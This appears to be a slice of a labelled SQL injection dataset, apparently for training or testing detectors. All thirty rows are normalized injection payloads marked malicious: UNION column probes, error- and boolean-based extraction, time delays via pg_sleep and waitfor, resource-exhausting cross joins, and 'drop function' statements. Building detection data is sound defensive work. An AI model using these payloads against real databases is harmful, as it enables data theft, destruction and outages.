row_index,payload_norm,label,sqli_type_hint
5220,"-3177' ) ) union all select 6500,6500,6500,6500,6500,6500,6500,6500,6500--",1,
5221,"-3130' ) ) ) union all select 2886,2886,2886,2886,2886,2886,2886#",1,
5222,"1' ) ( select ( case when ( 5451 = 5451 ) then regexp_substring ( repeat ( right ( char ( 5451 ) ,0 ) ,500000000 ) ,null ) else char ( 108 ) ||char ( 76 ) ||char ( 112 ) ||char ( 116 ) end ) from information_schema.system_users ) and ( 'sstt' = 'sstt",1,
5223,if ( 4135 = 2165 ) select 4135 else drop function otyy--,1,
5224,"1%"" ) ) and 6283 = 2068 and ( ( ""%"" = """,1,
5225,end and ( ( ( 'hwrs' like 'hwrs,1,
5226,1 ) as vxsh where 4706 = 4706,1,
5227,-8652' ) or 4747 = dbms_utility.sqlid_to_sqlhash ( ( chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) || ( select ( case when ( 4747 = 4747 ) then 1 else 0 end ) from dual ) ||chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113 ) ) ),1,
5228,"1'|| ( select 'ojdz' where 7350 = 7350 and 6510 = ( select count ( * ) from sysusers as sys1,sysusers as sys2,sysusers as sys3,sysusers as sys4,sysusers as sys5,sysusers as sys6,sysusers as sys7 ) ) ||'",1,
5229,"1'|| ( select 'kfyh' where 4737 = 4737 or row ( 1045,7562 ) > ( select count ( * ) ,concat ( 0x7171706a71, ( select ( elt ( 1045 = 1045,1 ) ) ) ,0x717a767a71,floor ( rand ( 0 ) *2 ) ) x from ( select 8488 union select 5584 union select 3051 union select 1210 ) a group by x ) ) ||'",1,
5230,( select 2527 from pg_sleep ( 5 ) ),1,
5231,"1"" ) ) as wwqj where 3249 = 3249 and 9254 = ( select count ( * ) from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4 ) --",1,
5232,"1 ) ) as acni where 6355 = 6355 and 9660 = ( select count ( * ) from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5 ) --",1,
5233,"-2766%' ) ) union all select 4458,4458,4458,4458,4458--",1,
5234,waitfor delay '0:0:5' and ( ( 'yjsp' like 'yjsp,1,
5235,"1'|| ( select 'nzjz' where 3539 = 3539 and 8148 = like ( 'abcdefg',upper ( hex ( randomblob ( 500000000/2 ) ) ) ) --",1,
5236,"-6360' ) as yfrk where 3683 = 3683 union all select 3683,3683,3683,3683,3683,3683,3683,3683,3683#",1,
5237,"1' in boolean mode ) union all select null,null,null,null--",1,
5238,"select * from generate_series ( 7494,7494,case when ( 7494 = 7854 ) then 1 else 0 end ) limit 1--",1,
5239,"1' ) or 7417 = ( select count ( * ) from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3 ) --",1,
5240,"1"" ) where 7513 = 7513 and row ( 6237,7469 ) > ( select count ( * ) ,concat ( 0x7171706a71, ( select ( elt ( 6237 = 6237,1 ) ) ) ,0x717a767a71,floor ( rand ( 0 ) *2 ) ) x from ( select 5192 union select 3785 union select 3931 union select 7158 ) a group by x ) --",1,
5241,"-1600%"" ) ) ) or elt ( 4568 = 7693,7693 ) and ( ( ( ""%"" = """,1,
5242,if ( 2695 = 9045 ) select 2695 else drop function qmno--,1,
5243,"select dbms_pipe.receive_message ( chr ( 66 ) ||chr ( 67 ) ||chr ( 79 ) ||chr ( 101 ) ,5 ) from dual and ( ( ( 7946 = 7946",1,
5244,"1 ) or char ( 68 ) ||char ( 69 ) ||char ( 97 ) ||char ( 85 ) = regexp_substring ( repeat ( right ( char ( 5389 ) ,0 ) ,5000000000 ) ,null ) and ( 5621 = 5621",1,
5245,"1 ) where 5309 = 5309 or 7552 = ( select count ( * ) from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4 ) --",1,
5246,"1"" where 4213 = 4213 and 8407 = ( select count ( * ) from generate_series ( 1,5000000 ) ) --",1,
5247,"-1859' union all select 1781,1781,1781,1781#",1,
5248,1' ) where 5214 = 5214,1,
5249,"select count ( * ) from generate_series ( 1,5000000 ) and ( ( ( '%' = '",1,
